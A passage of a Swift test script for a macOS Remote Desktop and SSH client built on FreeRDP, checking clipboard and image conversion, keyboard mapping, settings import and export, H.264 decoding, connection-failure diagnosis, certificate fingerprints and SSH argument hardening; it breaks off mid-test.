import AppKit
import IOSurface
import ImageIO
import UniformTypeIdentifiers
import VideoToolbox
import CoreMedia
import SwiftTerm

var passed = 0, failed = 0
func check(_ name: String, _ ok: Bool, _ detail: @autoclosure () -> String = "") {
    if ok { passed += 1; print("  ok    \(name)") }
    else { failed += 1; print("  FAIL  \(name)  \(detail())") }
}

// MARK: Text
print("== Text")
let sample = "line one\nline two\r\nnaïve €uro 😀"
let wire = ClipboardSync.windowsText(sample)
let wireUnits = stride(from: 0, to: wire.count - 2, by: 2).map { UInt16(wire[$0]) | UInt16(wire[$0 + 1]) << 8 }
check("ends with a UTF-16 NUL", wire.suffix(2) == Data([0, 0]))
check("LF becomes CRLF without doubling an existing CR",
      String(decoding: wireUnits, as: UTF16.self) == "line one\r\nline two\r\nnaïve €uro 😀")
check("round trip back to Mac text", ClipboardSync.macText(utf16: wire) == "line one\nline two\nnaïve €uro 😀")
check("stops at the first NUL", ClipboardSync.macText(utf16: Data([0x41, 0, 0, 0, 0x42, 0])) == "A")
check("odd byte count is safe", ClipboardSync.macText(utf16: Data([0x41, 0, 0x42])) == "A")

// MARK: File lists
print("== File list: ours, read by FreeRDP's own parser")
let files = [
    OutgoingFile(url: URL(fileURLWithPath: "/tmp/x"), path: "Folder", isDirectory: true, size: 0, modified: Date()),
    OutgoingFile(url: URL(fileURLWithPath: "/tmp/y"), path: "Folder\\a.txt", isDirectory: false, size: 12345, modified: Date()),
    OutgoingFile(url: URL(fileURLWithPath: "/tmp/z"), path: "Folder\\Sub\\b é😀.bin", isDirectory: false,
                 size: 5_000_000_000, modified: Date()),
]
var packed = Data()
var count = UInt32(files.count).littleEndian
packed.append(Data(bytes: &count, count: 4))
files.forEach { packed.append(ClipboardSync.descriptor(for: $0)) }
check("each descriptor is 592 bytes", ClipboardSync.descriptor(for: files[0]).count == 592)

var names = [CChar](repeating: 0, count: 8 * 260)
var attrs = [UInt32](repeating: 0, count: 8)
var sizes = [UInt64](repeating: 0, count: 8)
let parsedCount = packed.withUnsafeBytes { raw in
    shim_parse_file_list(raw.bindMemory(to: UInt8.self).baseAddress, UInt32(raw.count), &names, &attrs, &sizes, 8)
}
check("FreeRDP parses our list", parsedCount == 3, "got \(parsedCount)")
func name(_ i: Int) -> String {
    names.withUnsafeBufferPointer { String(cString: $0.baseAddress! + i * 260) }
}
for (i, f) in files.enumerated() where parsedCount == 3 {
    check("entry \(i) name \(f.path)", name(i) == f.path, "got \(name(i))")
    check("entry \(i) attributes", attrs[i] == (f.isDirectory ? 0x10 : 0x80), "got \(attrs[i])")
    check("entry \(i) size", sizes[i] == f.size, "got \(sizes[i])")
}

print("== File list: FreeRDP's, read by ours")
let srcNames = ["Report.docx", "Logs", "Logs\\ime.log"]
let srcAttrs: [UInt32] = [0x20, 0x10, 0x20]
let srcSizes: [UInt64] = [98765, 0, 3_000_000_000]
var outPtr: UnsafeMutablePointer<UInt8>?
var outLen: UInt32 = 0
let cNames = srcNames.map { strdup($0) }
let rc = cNames.map { UnsafePointer<CChar>($0) }.withUnsafeBufferPointer { nb in
    shim_serialize_file_list(nb.baseAddress, srcAttrs, srcSizes, 3, &outPtr, &outLen)
}
check("FreeRDP serialised", rc == 0 && outPtr != nil)
if let outPtr {
    let remote = ClipboardSync.parseFileList(Data(bytes: outPtr, count: Int(outLen)))
    check("we read 3 entries", remote.count == 3, "got \(remote.count)")
    for i in 0..<min(3, remote.count) {
        check("entry \(i) path", remote[i].path == srcNames[i], "got \(remote[i].path)")
        check("entry \(i) directory flag", remote[i].isDirectory == (srcAttrs[i] & 0x10 != 0))
        check("entry \(i) size", remote[i].size == srcSizes[i], "got \(String(describing: remote[i].size))")
    }
    free(outPtr)
}
cNames.forEach { free($0) }

// MARK: Images
print("== Images")
func makePNG(width: Int, height: Int, alpha: Bool) -> Data {
    let ctx = CGContext(data: nil, width: width, height: height, bitsPerComponent: 8, bytesPerRow: width * 4,
                        space: sRGB,
                        bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
    ctx.clear(CGRect(x: 0, y: 0, width: width, height: height))
    ctx.setFillColor(CGColor(srgbRed: 1, green: 0, blue: 0, alpha: 1))
    ctx.fill(CGRect(x: 0, y: height / 2, width: width, height: height - height / 2))   // top half red
    ctx.setFillColor(CGColor(srgbRed: 0, green: 0, blue: 1, alpha: alpha ? 0 : 1))
    ctx.fill(CGRect(x: 0, y: 0, width: width, height: height / 2))                     // bottom half blue or clear
    return ClipboardSync.encode(ctx.makeImage()!, as: .png)!
}
func pixel(_ image: CGImage, _ x: Int, _ y: Int) -> (UInt8, UInt8, UInt8, UInt8) {
    let ctx = CGContext(data: nil, width: image.width, height: image.height, bitsPerComponent: 8,
                        bytesPerRow: image.width * 4, space: sRGB,
                        bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
    ctx.draw(image, in: CGRect(x: 0, y: 0, width: image.width, height: image.height))
    let p = ctx.data!.assumingMemoryBound(to: UInt8.self)
    let o = (y * image.width + x) * 4   // row 0 is the top in the bitmap
    return (p[o], p[o + 1], p[o + 2], p[o + 3])
}

let png = makePNG(width: 37, height: 20, alpha: true)
let dib = ClipboardSync.dib(fromImageData: png)
check("Mac image converts to CF_DIB", dib != nil)
if let dib {
    check("DIB header is BITMAPINFOHEADER, 32 bpp", dib[0] == 40 && dib[14] == 32)
    check("DIB size is header plus pixels", dib.count == 40 + 37 * 20 * 4, "got \(dib.count)")
    if let back = ClipboardSync.image(fromDIB: dib) {
        check("DIB decodes to the same size", back.width == 37 && back.height == 20)
        let top = pixel(back, 5, 2), bottom = pixel(back, 5, 17)
        check("top half is red", top.0 > 240 && top.1 < 15 && top.2 < 15, "\(top)")
        check("transparent half became white, not black", bottom.0 > 240 && bottom.1 > 240 && bottom.2 > 240, "\(bottom)")
        check("result is opaque", bottom.3 == 255 && top.3 == 255)
    } else { check("DIB decodes", false) }
}

// A Windows-style 32 bpp BI_RGB DIB whose alpha bytes are all zero must not
// come out transparent.
var raw = Data()
func put32(_ v: UInt32) { withUnsafeBytes(of: v.littleEndian) { raw.append(contentsOf: $0) } }
func put16(_ v: UInt16) { withUnsafeBytes(of: v.littleEndian) { raw.append(contentsOf: $0) } }
put32(40); put32(2); put32(UInt32(bitPattern: -2)); put16(1); put16(32); put32(0)   // top-down
put32(16); put32(0); put32(0); put32(0); put32(0)
raw.append(contentsOf: [0, 255, 0, 0,   255, 0, 0, 0])      // row 0: green, blue (BGRA, alpha 0)
raw.append(contentsOf: [0, 0, 255, 0,   0, 0, 0, 0])        // row 1: red, black
if let img = ClipboardSync.image(fromDIB: raw) {
    let g = pixel(img, 0, 0), b = pixel(img, 1, 0), r = pixel(img, 0, 1)
    check("zero-alpha DIB is opaque", g.3 == 255 && r.3 == 255)
    check("top-down DIB keeps row order and colours", g.1 == 255 && b.2 == 255 && r.0 == 255, "\(g) \(b) \(r)")
} else { check("zero-alpha DIB decodes", false) }

// MARK: Keyboard and wheel
print("== Keyboard mapping")
check("A",            rdp_scancode_for_mac_keycode(0x00, false) == 0x1E)
check("Left arrow is extended", rdp_scancode_for_mac_keycode(0x7B, false) == 0x14B)
check("Return",       rdp_scancode_for_mac_keycode(0x24, false) == 0x1C)
check("ISO § key on an ISO Mac maps to the key left of 1", rdp_scancode_for_mac_keycode(0x0A, true) == 0x29)
check("ISO < key on an ISO Mac maps to the key left of Z", rdp_scancode_for_mac_keycode(0x32, true) == 0x56)
check("same keys unswapped on ANSI", rdp_scancode_for_mac_keycode(0x0A, false) == 0x56)
print("  this Mac's keyboard is ISO: \(rdp_mac_keyboard_is_iso())")

print("== Wheel encoding, MS-RDPBCGR 2.2.8.1.1.3.1.1.3")
check("+120 vertical",  rdp_wheel_flags(false, 120) == 0x0200 | 120)
check("-120 vertical",  rdp_wheel_flags(false, -120) == 0x0200 | 0x0100 | 0x88, String(rdp_wheel_flags(false, -120), radix: 16))
check("-1 is 0x1FF",    rdp_wheel_flags(false, -1) & 0x1FF == 0x1FF)
check("horizontal flag", rdp_wheel_flags(true, 40) == 0x0400 | 40)
check("clamped to 255", rdp_wheel_flags(false, 1000) & 0x1FF == 255)

// MARK: Surfaces
print("== Surface pool")
let w = 64, h = 32, rowBytes = w * 4
var frame = [UInt8](repeating: 0, count: rowBytes * h)
func fill(_ x0: Int, _ y0: Int, _ ww: Int, _ hh: Int, _ v: UInt8) {
    for y in y0..<y0 + hh { for x in x0..<x0 + ww { let o = y * rowBytes + x * 4; frame[o] = v; frame[o + 1] = v; frame[o + 2] = v; frame[o + 3] = 0 } }
}
func read(_ s: IOSurface, _ x: Int, _ y: Int) -> (UInt8, UInt8) {
    s.lock(options: .readOnly, seed: nil); defer { s.unlock(options: .readOnly, seed: nil) }
    let p = s.baseAddress.assumingMemoryBound(to: UInt8.self)
    let o = y * s.bytesPerRow + x * 4
    return (p[o], p[o + 3])
}
let pool = SurfacePool()
fill(0, 0, w, h, 10)
let s1 = frame.withUnsafeBufferPointer { pool.write(pixels: $0.baseAddress!, width: w, height: h, stride: rowBytes,
                                                   dirty: RDPRect(x: 0, y: 0, width: Int32(w), height: Int32(h)), full: true) }
check("first frame gives a surface to show", s1 != nil)
check("pixel copied and alpha forced opaque", s1.map { read($0, 3, 3) } .map { $0 == (10, 255) } ?? false)

fill(10, 10, 5, 5, 99)
let again = frame.withUnsafeBufferPointer { pool.write(pixels: $0.baseAddress!, width: w, height: h, stride: rowBytes,
                                                      dirty: RDPRect(x: 10, y: 10, width: 5, height: 5), full: false) }
check("while one is waiting to be shown, no second hop is scheduled", again == nil)
check("the waiting surface got the update", read(s1!, 12, 12).0 == 99)
pool.didDisplay(s1!)

fill(40, 2, 3, 3, 200)
let s2 = frame.withUnsafeBufferPointer { pool.write(pixels: $0.baseAddress!, width: w, height: h, stride: rowBytes,
                                                   dirty: RDPRect(x: 40, y: 2, width: 3, height: 3), full: false) }
check("the shown surface is never written: a second one is used", s2 != nil && s2 !== s1)
if let s2 {
    check("new surface has the latest change", read(s2, 41, 3).0 == 200)
    check("new surface also has earlier content it never saw", read(s2, 12, 12).0 == 99 && read(s2, 60, 30).0 == 10)
    check("shown surface left untouched", read(s1!, 41, 3).0 == 10)
    pool.didDisplay(s2)
    fill(0, 0, 2, 2, 7)
    let s3 = frame.withUnsafeBufferPointer { pool.write(pixels: $0.baseAddress!, width: w, height: h, stride: rowBytes,
                                                       dirty: RDPRect(x: 0, y: 0, width: 2, height: 2), full: false) }
    if let s3 {
        check("third write catches up on what it missed", read(s3, 41, 3).0 == 200 && read(s3, 1, 1).0 == 7)
    } else { check("third write gives a surface", false) }
}
let resized = [UInt8](repeating: 5, count: 32 * 4 * 16).withUnsafeBufferPointer {
    pool.write(pixels: $0.baseAddress!, width: 32, height: 16, stride: 32 * 4,
               dirty: RDPRect(x: 0, y: 0, width: 1, height: 1), full: false)
}
check("a size change starts fresh with a full copy", resized.map { $0.width == 32 && read($0, 31, 15).0 == 5 } ?? false)

// MARK: Settings
print("== Settings")
let old = #"{"hosts":[{"id":"6F1C0E1A-2B3C-4D5E-8F90-112233445566","address":"192.0.2.10","label":"files"}],"keyboardLayout":"0x080C"}"#
var decoded = try? JSONDecoder().decode(AppSettings.self, from: Data(old.utf8))
check("a config missing most keys still decodes", decoded != nil)
check("and keeps its hosts", decoded?.hosts.first?.address == "192.0.2.10")
check("and fills defaults", decoded?.dynamicResolution == true && decoded?.keyboardMode == .characters)
check("a host saved before Dock labels has none", decoded?.hosts.first?.dockLabel == "")
decoded?.normalize()
check("hosts without a gateway go to direct connections",
      decoded.map { $0.gateways.count == 1 && $0.gateways[0].isDirect && $0.hosts[0].gatewayID == $0.gateways[0].id } ?? false)

var fresh = AppSettings()
fresh.normalize()
check("a new install starts with direct connections", fresh.gateways.count == 1 && fresh.gateways[0].isDirect
      && fresh.gateways[0].title == "Direct connections")
check("and has no hosts or accounts", fresh.hosts.isEmpty && fresh.accounts.isEmpty)

var two = AppSettings()
let admin = Account(username: "admin", domain: "corp.example"), user = Account(username: "user@example.com", domain: "")
two.accounts = [admin, user]
two.gateways = [Gateway(name: "", host: "rdg.example.com", transport: .rpc, serverAccountID: admin.id,
                        separateAccount: true, gatewayAccountID: user.id),
                Gateway(name: "Lab", host: "")]
let lab = two.gateways[1].id
two.hosts = [Host(address: "192.0.2.10", label: "files"), Host(address: "192.0.2.20", label: "", gatewayID: lab)]
two.normalize()
check("a direct group is not added twice", two.gateways.filter(\.isDirect).count == 1)
check("a host without a gateway goes to direct connections", two.hosts[0].gatewayID == lab)
two.accounts.removeAll { $0.id == user.id }
two.normalize()
check("removing an account clears it from gateways", two.gateways[0].gatewayAccountID == nil)
check("a host keeps its own gateway", two.hosts[1].gatewayID == lab)
check("gateway(for:) finds it", two.gateway(for: two.hosts[1])?.title == "Lab")
two.gateways.removeFirst()
two.normalize()
check("hosts of a removed gateway fall back to direct connections",
      two.hosts.allSatisfy { $0.gatewayID == lab } && two.lastGatewayID == two.gateways[0].id)
// security -g, as seen from security itself: plain text quoted, anything else hex.
check("Keychain: plain password", Keychain.revealed(#"password: "plain""#) == "plain")
check("Keychain: quotes inside", Keychain.revealed(#"password: "a"b""#) == #"a"b"#)
check("Keychain: non-ASCII comes as hex", Keychain.revealed(#"password: 0x70C3A4737377C3B67264  "p\303\244ssw\303\266rd""#) == "pässwörd")
check("Keychain: a password that looks like hex stays itself", Keychain.revealed(#"password: "0xdead""#) == "0xdead")

// MARK: Export and import
print("== Export and import")
var source = AppSettings()
source.accounts = [admin]
source.gateways = [Gateway(name: "Office", host: "rdg.example.com", transport: .http, serverAccountID: admin.id)]
source.hosts = [Host(address: "192.0.2.10", label: "files", gatewayID: source.gateways[0].id, dockLabel: "F",
                     labelColor: "#FF9F0A"),
                Host(address: "198.51.100.5", label: "lab pc")]
source.normalize()
let exported = try! source.exportedHosts()
let exportedText = String(decoding: exported, as: UTF8.self)
check("the export has gateways and hosts", exportedText.contains("rdg.example.com") && exportedText.contains("198.51.100.5"))
check("but no accounts", !exportedText.contains("admin") && !exportedText.contains("corp.example")
      && !exportedText.contains(admin.id.uuidString))
var target = AppSettings()
target.normalize()
let first = try? target.importHosts(from: exported)
check("importing into an empty list adds everything", first?.hosts == 2 && first?.gateways == 1 && first?.skipped == 0)
check("the gateway keeps its transport and name",
      target.gateways.contains { $0.host == "rdg.example.com" && $0.transport == .http && $0.name == "Office" })
check("direct hosts land in direct connections",
      target.hosts.first { $0.address == "198.51.100.5" }.flatMap { target.gateway(for: $0) }?.isDirect == true)
check("the label comes along", target.hosts.first { $0.address == "192.0.2.10" }?.dockLabel == "F")
check("and so does its colour", target.hosts.first { $0.address == "192.0.2.10" }?.labelColor == "#FF9F0A")
check("signing out of Windows is a normal end", ConnectError.endReason("ERRINFO_LOGOFF_BY_USER") != nil
      && ConnectError.endReason("ERRINFO_RPC_INITIATED_DISCONNECT_BY_USER") != nil
      && ConnectError.endReason("ERRCONNECT_LOGON_FAILURE") == nil)
check("near-black label colours are lightened", (NSColor(hex: "#000000")?.visibleOnBlack.hexString ?? "#000000") != "#000000"
      && NSColor(hex: "#FFB020")?.visibleOnBlack.hexString == "#FFB020")
let reimport = try? target.importHosts(from: exported)
check("importing again adds nothing", reimport?.hosts == 0 && reimport?.gateways == 0 && reimport?.skipped == 2)
check("a file that is not a host list is refused",
      (try? target.importHosts(from: Data(#"{"format":"other","gateways":[]}"#.utf8))) == nil)

// MARK: H.264
print("== H.264")
// The local test server can't send H.264, so the Mac's own encoder makes a
// frame and FreeRDP's AVC420 path, the one Windows streams take, decodes it.
func encodeRedFrame(width: Int, height: Int) -> Data? {
    var session: VTCompressionSession?
    guard VTCompressionSessionCreate(allocator: nil, width: Int32(width), height: Int32(height),
                                     codecType: kCMVideoCodecType_H264, encoderSpecification: nil,
                                     imageBufferAttributes: nil, compressedDataAllocator: nil,
                                     outputCallback: nil, refcon: nil, compressionSessionOut: &session) == noErr,
          let session else { return nil }
    VTSessionSetProperty(session, key: kVTCompressionPropertyKey_ProfileLevel, value: kVTProfileLevel_H264_Main_AutoLevel)
    var pixels: CVPixelBuffer?
    CVPixelBufferCreate(nil, width, height, kCVPixelFormatType_32BGRA, nil, &pixels)
    guard let pixels else { return nil }
    CVPixelBufferLockBaseAddress(pixels, [])
    let base = CVPixelBufferGetBaseAddress(pixels)!.assumingMemoryBound(to: UInt8.self)
    let stride = CVPixelBufferGetBytesPerRow(pixels)
    for y in 0..<height { for x in 0..<width {
        let p = base + y * stride + x * 4
        p[0] = 0; p[1] = 0; p[2] = 255; p[3] = 255           // BGRA red
    } }
    CVPixelBufferUnlockBaseAddress(pixels, [])
    var annexB = Data()
    let startCode = Data([0, 0, 0, 1])
    let done = DispatchSemaphore(value: 0)
    VTCompressionSessionEncodeFrame(session, imageBuffer: pixels, presentationTimeStamp: .zero, duration: .invalid,
                                    frameProperties: [kVTEncodeFrameOptionKey_ForceKeyFrame: true] as CFDictionary,
                                    infoFlagsOut: nil) { status, _, sample in
        defer { done.signal() }
        guard status == noErr, let sample, let format = CMSampleBufferGetFormatDescription(sample) else { return }
        // Parameter sets first, then the frame, each with an Annex B start code.
        var count = 0
        CMVideoFormatDescriptionGetH264ParameterSetAtIndex(format, parameterSetIndex: 0, parameterSetPointerOut: nil,
                                                           parameterSetSizeOut: nil, parameterSetCountOut: &count,
                                                           nalUnitHeaderLengthOut: nil)
        for i in 0..<count {
            var pointer: UnsafePointer<UInt8>?
            var size = 0
            CMVideoFormatDescriptionGetH264ParameterSetAtIndex(format, parameterSetIndex: i, parameterSetPointerOut: &pointer,
                                                               parameterSetSizeOut: &size, parameterSetCountOut: nil,
                                                               nalUnitHeaderLengthOut: nil)
            if let pointer { annexB += startCode + Data(bytes: pointer, count: size) }
        }
        guard let block = CMSampleBufferGetDataBuffer(sample) else { return }
        var length = 0
        var pointer: UnsafeMutablePointer<CChar>?
        CMBlockBufferGetDataPointer(block, atOffset: 0, lengthAtOffsetOut: nil, totalLengthOut: &length, dataPointerOut: &pointer)
        guard let pointer else { return }
        let bytes = Data(bytes: pointer, count: length)
        var offset = 0
        while offset + 4 <= bytes.count {           // AVCC: 4-byte big-endian lengths
            let nal = Int(bytes[offset]) << 24 | Int(bytes[offset + 1]) << 16 | Int(bytes[offset + 2]) << 8 | Int(bytes[offset + 3])
            annexB += startCode + bytes.subdata(in: offset + 4 ..< offset + 4 + nal)
            offset += 4 + nal
        }
    }
    VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
    done.wait()
    VTCompressionSessionInvalidate(session)
    return annexB.isEmpty ? nil : annexB
}
if let frame = encodeRedFrame(width: 64, height: 64) {
    var decodedPixels = [UInt8](repeating: 0, count: 64 * 64 * 4)
    let status = frame.withUnsafeBytes { shim_h264_decode($0.baseAddress!.assumingMemoryBound(to: UInt8.self),
                                                           UInt32(frame.count), 64, 64, &decodedPixels) }
    check("FreeRDP decodes H.264 with Apple's VideoToolbox", status >= 0, "status \(status)")
    let center = (32 * 64 + 32) * 4
    let (b, g, r) = (decodedPixels[center], decodedPixels[center + 1], decodedPixels[center + 2])
    check("and the red frame comes out red", r > 200 && g < 60 && b < 60, "BGR \(b) \(g) \(r)")
} else {
    // Virtual Macs (like CI runners) may have no hardware H.264 encoder.
    print("  skip  no H.264 encoder on this Mac to make a test frame")
}

// MARK: What failed
print("== What failed")
func diagnosis(_ code: String = "", stage: RDPStage = RDPStageTransport, progress: Int32 = -1,
               reason: UInt32 = 0, authAt: Int32? = nil) -> RDPDiagnosis {
    var d = RDPDiagnosis()
    d.stage = stage
    d.gatewayProgress = progress
    d.gatewayReason = reason
    d.authError = authAt != nil
    d.authErrorProgress = authAt ?? -1
    return d
}
let viaGW = Gateway(name: "", host: "rdg.example.com", transport: .rpc)
let directGW = Gateway()
let failingHost = Host(address: "192.0.2.10", label: "files")
func failure(_ d: RDPDiagnosis, _ code: String, _ gw: Gateway = viaGW, refused: CertificateInfo? = nil) -> ConnectionFailure {
    ConnectionFailure.diagnose(d, code: code, host: failingHost, gateway: gw, refused: refused)
}
var f = failure(diagnosis(), "ERRCONNECT_DNS_NAME_NOT_FOUND")
check("gateway name not found", f.failedStep == .reachGateway && f.headline == "Couldn't find rdg.example.com", f.headline)
f = failure(diagnosis(), "ERRCONNECT_CONNECT_FAILED")
check("gateway not answering", f.failedStep == .reachGateway && f.headline == "Couldn't reach the gateway", f.headline)
f = failure(diagnosis(authAt: -1), "ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED")
check("a sign-in error before the tunnel is the gateway's sign-in, not 'security negotiation'",
      f.failedStep == .gatewayLogin && f.login == .gateway, "\(String(describing: f.failedStep)) \(f.headline)")
f = failure(diagnosis(), "ERRCONNECT_ACCESS_DENIED")
check("gateway rejects the password", f.failedStep == .gatewayLogin && f.detail.contains("rejected"), f.detail)
f = failure(diagnosis(progress: 1), "ERRCONNECT_CONNECT_TRANSPORT_FAILED")
check("signed in but the gateway's policy says no", f.failedStep == .gatewayPolicy, "\(String(describing: f.failedStep))")
f = failure(diagnosis(progress: 2), "ERRCONNECT_CONNECT_TRANSPORT_FAILED")
check("allowed but the gateway can't reach the server", f.failedStep == .gatewayToServer && f.headline.contains("files"), f.headline)
f = failure(diagnosis(progress: 2, reason: 0x800759DD), "ERRCONNECT_CONNECT_TRANSPORT_FAILED")
check("the gateway's own reason wins: server unreachable", f.failedStep == .gatewayToServer && f.detail.contains("may be off"), f.detail)
f = failure(diagnosis(progress: 1, reason: 0x800759DA), "")
check("the gateway's own reason: not allowed to that server", f.failedStep == .gatewayPolicy && f.headline == "Not allowed to this server", f.headline)
f = failure(diagnosis("x", stage: RDPStageLogin, progress: 4), "ERRCONNECT_LOGON_FAILURE")
check("through a ready tunnel, a rejected login is the server's", f.failedStep == .serverLogin && f.login == .server, "\(String(describing: f.failedStep))")
f = failure(diagnosis(stage: RDPStageLicensing, progress: 4), "ERRCONNECT_CONNECT_TRANSPORT_FAILED")
check("licensing", f.failedStep == .sessionStart && f.headline == "No remote desktop license", f.headline)
f = failure(diagnosis(), "ERRCONNECT_CONNECT_FAILED", directGW)
check("direct: nothing answers", f.failedStep == .reachServer && f.headline == "Couldn't reach files", f.headline)
let refusedCert = """
-----BEGIN CERTIFICATE-----
MIIB
-----END CERTIFICATE-----
""".withCString { p in "rdg.example.com".withCString { h in
    CertificateInfo(RDPCertificate(host: h, port: 443, commonName: h, subject: h, issuer: h, fingerprint: p, isPEM: true,
                                   gateway: true, changed: false, mismatch: false, oldSubject: nil, oldIssuer: nil,
                                   oldFingerprint: nil, oldIsPEM: false)) } }
f = failure(diagnosis(), "ERRCONNECT_TLS_CONNECT_FAILED", refused: refusedCert)
check("a refused certificate is said as such", f.failedStep == .reachGateway && f.headline == "Certificate not trusted", f.headline)
f = failure(diagnosis(progress: 2), "ERRCONNECT_CONNECT_TRANSPORT_FAILED")
check("steps before the failed one are done, after it not reached",
      f.steps.map(\.status) == [.done, .done, .done, .failed, .notReached, .notReached], "\(f.steps.map(\.status))")

print("== Reading FreeRDP's log")
let logDir = FileManager.default.temporaryDirectory.appendingPathComponent("igateway-log-\(getpid())")
try? FileManager.default.createDirectory(at: logDir, withIntermediateDirectories: true)
rdp_log_init(logDir.path)
rdp_log_reset()
shim_log("com.freerdp.core.gateway.tsg", 1, "TSG_STATE_INITIAL -> TSG_STATE_CONNECTED")   // WLOG_DEBUG
shim_log("com.freerdp.core.gateway.tsg", 1, "TSG_STATE_CONNECTED -> TSG_STATE_AUTHORIZED")
shim_log("com.freerdp.core.gateway.tsg", 4, "TsProxyCreateChannel failed: E_PROXY_TS_CONNECTFAILED")   // WLOG_ERROR
var collected = RDPDiagnosis()
rdp_log_diagnosis(&collected)
check("the gateway's furthest step is read from its state changes", collected.gatewayProgress == 2, "\(collected.gatewayProgress)")
check("the gateway's reason code is picked out", collected.gatewayReason == 0x800759DD, String(collected.gatewayReason, radix: 16))
shim_log("com.freerdp.core.auth", 4, "credssp_auth_authenticate status SEC_E_LOGON_DENIED")
rdp_log_diagnosis(&collected)
check("a sign-in error is noted with how far the gateway was", collected.authError && collected.authErrorProgress == 2)
let written = (try? String(contentsOf: logDir.appendingPathComponent("freerdp.log"), encoding: .utf8)) ?? ""
check("errors still go to freerdp.log, the debug state lines don't",
      written.contains("E_PROXY_TS_CONNECTFAILED") && !written.contains("TSG_STATE_CONNECTED -> "), written)
rdp_log_reset()
rdp_log_diagnosis(&collected)
check("a new connection starts from nothing", collected.gatewayProgress == -1 && !collected.authError)

// MARK: Certificates
print("== Certificates")
// A throwaway self-signed certificate; its SHA-256 checked with: openssl x509 -fingerprint -sha256
let pem = """
-----BEGIN CERTIFICATE-----
MIICqjCCAZICCQCy7Esh2028MjANBgkqhkiG9w0BAQsFADAXMRUwEwYDVQQDDAx0
ZXN0LmV4YW1wbGUwHhcNMjYxMDI2MDAxODQ3WhcNMzYxMDIzMDAxODQ3WjAXMRUw
EwYDVQQDDAx0ZXN0LmV4YW1wbGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQCiysYL7rf/EwSd9oEHqmbA4FzXPVM4BLrIF5sCSM6+YJyqMlxkOwi1r/B5
0rKIZTlneWdR471HewKz7Q+Ilw6N3aQgo9Cz4CNXzHv/vVAz3pqxyZeU1Rq9x4pQ
rabKq6FiBZOoLaV0pHcIHv4ObkcKHbnP97AcU4rvQyYk+i0W83BuWPEjvwtOxjod
I/DwLKogFSeJRqQ0yocg8uVUqIFbSVr7pORPrFgHbaDQnu2EI5JEwE3ZndoUEQHV
i94wsy1sUzQGuTQeLmLw0zJk5Cj9Y63xCvVgasaHnInKMeZbusfIKaMjCCjDOoRX
JIwMrLs0H9GU9iPxK/6oyxGyCi41AgMBAAEwDQYJKoZIhvcNAQELBQADggEBADaY
JYRrG5B6OeiKRjzk9aQFf/W/kWlFmPmy6SKXRtCZnZoynKLaJey6jbghBgBHJ63z
CoZuPQMyypfBs8z2jWgQV4+wLFN/k/e9JaltrqEmnQz3LDmbkvpiu+Tre57p2NA3
iuypMCgE1p1xHcVnI3qj9c5jElpAUddbbv4QjIZKtZOyl9VuwozQeFc5YHqaj/E9
tjinp3cikyEm7V998hBgK9Pq2qqShSWIOumVAZ+VFlRgYm/x/QskVolgaSaw2kC5
gkDY7UQCfFNvLs0FTvSnlewUHoFlHdQ30xo4jVPrHDOT5eHUb6oOTogRAnPfdQ8h
ZQZXSZEP/7x/gX7W9Q0=
-----END CERTIFICATE-----
"""
check("PEM certificates show their SHA-256", CertificateInfo.fingerprint(pem, isPEM: true)
      == "E0:71:A3:8D:4D:E6:3F:F4:F3:12:EE:D9:76:EE:10:4A:10:06:95:38:A2:89:57:45:9C:1F:24:DB:87:87:75:66")
check("other fingerprints pass through", CertificateInfo.fingerprint("ab:cd", isPEM: false) == "ab:cd")
check("with a chain, the fingerprint is the server's own certificate",
      CertificateInfo.fingerprint(pem + "\n" + pem.replacingOccurrences(of: "MII", with: "MIJ"), isPEM: true)
      == CertificateInfo.fingerprint(pem, isPEM: true))
check("every certificate in a chain is read", CertificateInfo.certificates(inPEM: pem + "\n" + pem).count == 2)
func certificateInfo(pem: String, host: String) -> CertificateInfo {
    pem.withCString { p in host.withCString { h in
        CertificateInfo(RDPCertificate(host: h, port: 3389, commonName: h, subject: h, issuer: h, fingerprint: p,
                                       isPEM: true, gateway: false, changed: false, mismatch: false,
                                       oldSubject: nil, oldIssuer: nil, oldFingerprint: nil, oldIsPEM: false))
    } }
}
check("macOS does not trust a self-signed certificate", !certificateInfo(pem: pem, host: "test.example").trustedByMac)

// MARK: NTLM crypto
print("== NTLM crypto")
// NTLM needs MD4 and RC4, which OpenSSL 3 only has in a module a static build
// lacks. FreeRDP's own copies must stand in. Test vectors: RFC 1320 for MD4,
// and the widely published RC4 vector (key "Key", plaintext "Plaintext").
var md4 = [UInt8](repeating: 0, count: 16)
let md4OK = shim_md4(Array("abc".utf8), 3, &md4) == 1
check("MD4 works", md4OK && md4.map { String(format: "%02x", $0) }.joined() == "a448017aaf21d8525fc10ae87aa6729d",
      md4.map { String(format: "%02x", $0) }.joined())
var rc4 = [UInt8](repeating: 0, count: 9)
let rc4OK = shim_rc4(Array("Key".utf8), 3, Array("Plaintext".utf8), 9, &rc4) == 1
check("RC4 works", rc4OK && rc4.map { String(format: "%02X", $0) }.joined() == "BBF316E8D940AF0AD3",
      rc4.map { String(format: "%02X", $0) }.joined())

let gw = try? JSONDecoder().decode(Gateway.self, from: Data(#"{"host":"rdg.example.com","transport":"weird"}"#.utf8))
check("a gateway with odd values still decodes", gw?.host == "rdg.example.com" && gw?.transport == .automatic)
check("detected keyboard layout is one of ours", KeyboardLayout.allCases.contains(KeyboardLayout.detected()))
print("  detected layout here: \(KeyboardLayout.detected().label)")

// MARK: SSH
print("== SSH")
let oldHost = try? JSONDecoder().decode(Host.self, from: Data(#"{"address":"192.0.2.30","label":""}"#.utf8))
check("a host saved before SSH is Remote Desktop", oldHost?.kind == .rdp && oldHost?.sshAuth == .key)
var ssh = Host(address: "server.example.com", label: "web")
ssh.kind = .ssh
ssh.sshUser = "admin"
let sshBack = try? JSONDecoder().decode(Host.self, from: JSONEncoder().encode(ssh))
check("an SSH host saves and loads", sshBack?.isSSH == true && sshBack?.sshUser == "admin")

func sshArgs(_ change: (inout Host) -> Void) -> [String]? {
    var h = ssh
    change(&h)
    return try? SSHCommand.arguments(for: h)
}
let keyArgs = sshArgs { _ in } ?? []
check("the locked-down options are always there", ["ForwardAgent=no", "ForwardX11=no", "StrictHostKeyChecking=ask"]
      .allSatisfy { keyArgs.contains($0) })
check("the destination comes last, after --", keyArgs.suffix(2) == ["--", "admin@server.example.com"])
check("a key host never falls back to a password",
